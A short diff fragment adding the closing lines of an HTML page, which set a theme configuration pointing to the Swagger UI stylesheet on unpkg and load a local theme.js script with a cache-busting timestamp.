+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1738202701  };
+    </script>
+    <script src="/js/theme.js?1738202701" defer></script>
+  </body>
+</html>
